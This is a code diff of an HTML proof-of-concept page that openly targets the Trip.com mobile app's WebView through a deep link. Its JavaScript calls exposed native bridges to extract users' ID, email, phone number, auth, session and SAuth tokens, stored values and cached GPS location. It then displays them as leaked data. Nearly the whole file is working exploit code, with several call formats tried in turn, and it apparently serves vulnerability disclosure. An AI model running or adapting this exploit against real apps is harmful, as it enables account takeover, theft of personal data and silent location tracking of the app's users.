@@ -3,200 +3,151 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trip.com - FULL ACCOUNT TAKEOVER POC (Real Leak)</title>
+    <title>Trip.com - CRITICAL ACCOUNT TAKEOVER POC</title>
     <style>
-        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; --blue:#58a6ff; }
+        :root { --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#c9d1d9; --red:#f85149; --green:#3fb950; }
         body { font-family:-apple-system,system-ui,sans-serif; background:var(--bg); color:var(--text); margin:0; padding:20px; }
         h1 { color:var(--red); text-align:center; font-size:28px; }
-        .subtitle { text-align:center; color:#8b949e; margin:10px 0 30px; }
+        .subtitle { text-align:center; color:#8b949e; margin:10px 0 30px; font-size:15px; }
         .container { max-width:1200px; margin:auto; display:flex; flex-direction:column; gap:20px; }
         .card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; }
-        .card-header { display:flex; justify-content:space-between; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; margin-bottom:15px; }
+        .card-header { display:flex; justify-content:space-between; align-items:center; font-weight:600; border-bottom:1px solid var(--border); padding-bottom:12px; }
         .status { padding:4px 12px; border-radius:20px; font-size:12px; font-weight:bold; }
         .vulnerable { background:var(--red); color:white; }
         .data-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(300px,1fr)); gap:12px; }
         .data-item { background:#000; border:1px solid var(--border); border-left:5px solid var(--red); padding:12px; border-radius:6px; }
         .data-label { font-size:11px; color:#8b949e; text-transform:uppercase; }
         .data-value { font-family:monospace; font-size:14px; word-break:break-all; color:#fff; }
-        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:320px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
-        .bridge-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(320px,1fr)); gap:15px; }
-        .pill { background:rgba(88,166,255,0.1); color:var(--blue); padding:2px 8px; border-radius:20px; font-size:11px; margin:2px; }
+        .console { background:#010409; padding:12px; font-family:monospace; font-size:12px; max-height:340px; overflow-y:auto; border:1px solid var(--border); border-radius:6px; }
     </style>
 </head>
 <body>
-    <h1>TRIP.COM - FULL ACCOUNT TAKEOVER POC</h1>
-    <p class="subtitle">Real PII + Session Token + SAuth Leak via DeepLink (H5UserPlugin + IBUStorageV2Plugin)</p>
+    <h1>TRIP.COM - CRITICAL ACCOUNT TAKEOVER</h1>
+    <p class="subtitle">Real PII + Auth/Token/SAuth Leak via DeepLink (H5UserPlugin + IBUStorageV2Plugin)</p>
 
     <div class="container">
         <div class="card">
-            <div class="card-header">Exposed Bridges & Methods <span id="count" class="status">Scanning...</span></div>
-            <div class="bridge-grid" id="bridges"></div>
-        </div>
-
-        <div class="card">
-            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="data-status" class="status">Waiting...</span></div>
+            <div class="card-header">Leaked Sensitive Data (PII + Tokens) <span id="data-status" class="status">Waiting for leak...</span></div>
             <div class="data-grid" id="data"></div>
         </div>
 
         <div class="card">
-            <div class="card-header">Live Log</div>
+            <div class="card-header">Live Execution Log</div>
             <div class="console" id="console"></div>
         </div>
     </div>
 
     <script>
-        const logEl = document.getElementById("console");
+        const consoleEl = document.getElementById("console");
         const dataEl = document.getElementById("data");
-        let leaked = false;
+        let hasLeak = false;
 
-        function log(txt, type="info") {
-            const d = document.createElement("div");
-            d.innerHTML = `[${new Date().toISOString().slice(11,19)}] <span style="color:${type==='success'?'#3fb950':type==='error'?'#f85149':'#c9d1d9'}">${txt}</span>`;
-            logEl.appendChild(d);
-            logEl.scrollTop = logEl.scrollHeight;
+        function log(msg, type="info") {
+            const div = document.createElement("div");
+            const color = type==="success"?"#3fb950":type==="error"?"#f85149":"#c9d1d9";
+            div.innerHTML = `[${new Date().toISOString().slice(11,19)}] <span style="color:${color}">${msg}</span>`;
+            consoleEl.appendChild(div);
+            consoleEl.scrollTop = consoleEl.scrollHeight;
         }
 
         function render(label, value) {
-            if (!leaked) { dataEl.innerHTML = ""; leaked = true; }
+            if (!hasLeak) { dataEl.innerHTML = ""; hasLeak = true; }
             if (document.getElementById("d-"+label)) return;
-            const div = document.createElement("div");
-            div.className = "data-item";
-            div.id = "d-"+label;
-            const val = typeof value === "object" ? JSON.stringify(value,null,2) : (value||"NULL");
+            const div = document.createElement("div"); div.className = "data-item"; div.id = "d-"+label;
+            const val = typeof value === "object" ? JSON.stringify(value,null,2) : (value || "NULL");
             div.innerHTML = `<div class="data-label">${label}</div><div class="data-value">${val}</div>`;
             dataEl.appendChild(div);
-            document.getElementById("data-status").textContent = "LEAK SUCCESSFUL!";
+            document.getElementById("data-status").innerText = "DATA LEAKED! (CRITICAL)";
             document.getElementById("data-status").classList.add("vulnerable");
         }
 
-        // ── Global Base64 Callback (ax0.b wrapper) ──
+        // ── THE ONLY CALLBACK THAT MATTERS (ax0.b → __bridge_callback) ──
         window.__bridge_callback = function(base64) {
             try {
                 const json = JSON.parse(atob(base64));
-                const tag = json.tagname || json.callbackTagName || "unknown";
+                const tag = json.tagname || "unknown";
                 log(`Bridge callback → ${tag}`, "success");
-                if (json.param || json.value || json.data) {
-                    const data = json.param || json.value || json.data;
-                    if (data.UserID) {
-                        render("UserID", data.UserID);
-                        render("Email", data.Email);
-                        render("Mobile", data.Mobile);
-                        render("Auth Token", data.Auth);
-                        render("Session Token", data.Token);
-                        render("SAuth", data.SAuth);
-                    }
-                    if (data.value) render(`Storage: ${tag}`, data.value);
+
+                const data = json.param || json.value || json;
+                if (data.UserID || data.Email || data.Token) {
+                    render("UserID", data.UserID);
+                    render("Email", data.Email);
+                    render("Mobile", data.Mobile);
+                    render("Auth Token", data.Auth);
+                    render("Session Token", data.Token);
+                    render("SAuth", data.SAuth);
                 }
-            } catch(e){}
+                if (data.value) render(`Storage: ${tag}`, data.value);
+            } catch(e) { log("Callback parse failed: " + e.message, "error"); }
         };
 
-        // ── Dynamic direct callback handler (H5URLCommand style) ──
-        function createCallback(id) {
-            window[id] = function(result) {
-                log(`Direct callback ${id} received`, "success");
-                if (result && typeof result === "object") {
-                    if (result.UserID || result.data) {
-                        const d = result.data || result;
-                        render("UserID", d.UserID);
-                        render("Email", d.Email);
-                        render("Mobile", d.Mobile);
-                        render("Auth", d.Auth);
-                        render("Token", d.Token);
-                        render("SAuth", d.SAuth);
-                    }
-                    if (result.value) render("Storage Value", result.value);
+        // ── Direct fallback (in case LoadJsHolder calls window[cb] directly) ──
+        function registerDirectCallback(name) {
+            window[name] = function(res) {
+                log(`Direct callback ${name} fired`, "success");
+                if (res && (res.UserID || res.param)) {
+                    const d = res.param || res;
+                    render("UserID", d.UserID);
+                    render("Email", d.Email);
+                    render("Token", d.Token);
+                    render("SAuth", d.SAuth);
                 }
             };
-            return id;
+            return name;
         }
 
-        // ── Main Exploit ──
-        async function runExploit() {
-            log("=== STARTING REAL EXPLOIT (based on H5UserPlugin + H5StorageV2) ===", "success");
+        async function exploit() {
+            log("=== STARTING CRITICAL EXPLOIT (exact H5URLCommand format) ===", "success");
 
-            // 1. User_a.getUserInfo (PII + Tokens)
+            const cb1 = registerDirectCallback("leak_user_" + Date.now());
+
+            // 1. User_a.getUserInfo - دقیق‌ترین فرمت‌ها (plain string + callback key)
             if (window.User_a && typeof window.User_a.getUserInfo === "function") {
-                log("Attacking User_a.getUserInfo() ...");
-                const cb1 = createCallback("userInfoCb_" + Date.now());
                 const formats = [
+                    cb1,                                          // plain string callback
+                    JSON.stringify({callback: cb1}),
                     JSON.stringify({callbackTagName: cb1}),
-                    JSON.stringify({tagname: cb1}),
-                    JSON.stringify({callbackTagName: cb1, arguments: {}}),
-                    "{}"
+                    JSON.stringify({tagname: cb1})
                 ];
                 for (let f of formats) {
-                    try {
-                        window.User_a.getUserInfo(f);
-                        log(`Sent with format: ${f.substring(0,80)}...`);
-                    } catch(e){}
+                    try { window.User_a.getUserInfo(f); log(`getUserInfo sent: ${f.substring(0,60)}...`); } catch(e){}
                 }
             }
 
-            // 2. IBUStorageV2_a.IBUGetUserValue (tokens + userInfo)
+            // 2. IBUStorageV2_a.IBUGetUserValue - با bussiness/key + callback
             if (window.IBUStorageV2_a) {
-                log("Dumping storage keys via IBUGetUserValue...");
                 const targets = [
-                    {bussiness:"user", key:"userInfo"},
-                    {bussiness:"common", key:"token"},
-                    {bussiness:"common", key:"uid"},
-                    {bussiness:"common", key:"vtoken"},
-                    {bussiness:"common", key:"auth"},
-                    {bussiness:"login", key:"auth"}
+                    {b:"user", k:"userInfo"}, {b:"common", k:"token"}, {b:"common", k:"uid"},
+                    {b:"common", k:"vtoken"}, {b:"common", k:"auth"}
                 ];
-
                 for (let t of targets) {
-                    const cb = createCallback("storageCb_" + Date.now());
+                    const cb = registerDirectCallback("leak_store_" + Date.now());
                     const formats = [
-                        JSON.stringify({callbackTagName: cb, arguments: {bussiness: t.bussiness, key: t.key}}),
-                        JSON.stringify({callbackTagName: cb, bussiness: t.bussiness, key: t.key}),
-                        JSON.stringify({tagname: cb, arguments: {bussiness: t.bussiness, key: t.key}})
+                        JSON.stringify({callback: cb, bussiness: t.b, key: t.k}),
+                        JSON.stringify({callbackTagName: cb, bussiness: t.b, key: t.k}),
+                        JSON.stringify({callback: cb, arguments: {bussiness: t.b, key: t.k}}),
+                        JSON.stringify({callbackTagName: cb, arguments: {bussiness: t.b, key: t.k}})
                     ];
                     for (let f of formats) {
-                        try {
-                            window.IBUStorageV2_a.IBUGetUserValue(f);
-                        } catch(e){}
+                        try { window.IBUStorageV2_a.IBUGetUserValue(f); } catch(e){}
                     }
                 }
             }
 
-            // 3. Location (synchronous)
+            // 3. Silent GPS
             setTimeout(() => {
-                if (window.Locate_a) {
-                    const methods = ["getCachedLocationData","getCachedCtripCity","getLocation","getCurrentLocation","getGeoLocation"];
-                    for (let m of methods) {
-                        if (typeof window.Locate_a[m] === "function") {
-                            try {
-                                let loc = window.Locate_a[m]();
-                                if (loc) {
-                                    const lat = loc.lat || loc.latitude || (loc.cachedGeo && loc.cachedGeo.lat);
-                                    const lng = loc.lng || loc.longitude || (loc.cachedGeo && loc.cachedGeo.lng);
-                                    render("GPS (Cached)", `Lat: ${lat} | Lng: ${lng}`);
-                                }
-                            } catch(e){}
-                        }
-                    }
+                if (window.Locate_a && typeof window.Locate_a.getCachedLocationData === "function") {
+                    try {
+                        const loc = window.Locate_a.getCachedLocationData();
+                        if (loc) render("GPS Location", `Lat: ${loc.lat || loc.latitude} | Lng: ${loc.lng || loc.longitude}`);
+                    } catch(e){}
                 }
-            }, 800);
+            }, 1200);
         }
 
-        // Scan + Start
         window.onload = () => {
-            log("Scanning all _a bridges...");
-            let count = 0;
-            const grid = document.getElementById("bridges");
-            for (let key in window) {
-                if (key.endsWith("_a") && typeof window[key] === "object") {
-                    count++;
-                    const methods = Object.getOwnPropertyNames(window[key]).filter(k => typeof window[key][k] === "function");
-                    const card = document.createElement("div");
-                    card.innerHTML = `<strong>${key}</strong> <span style="color:#3fb950">(${methods.length} methods)</span><br>${methods.map(m=>`<span class="pill">${m}</span>`).join("")}`;
-                    grid.appendChild(card);
-                }
-            }
-            document.getElementById("count").textContent = `${count} Bridges Exposed`;
-            document.getElementById("count").classList.add("vulnerable");
-
-            setTimeout(runExploit, 600);
+            log("Scanning bridges + starting exploit...");
+            setTimeout(exploit, 800);
         };
     </script>
 </body>
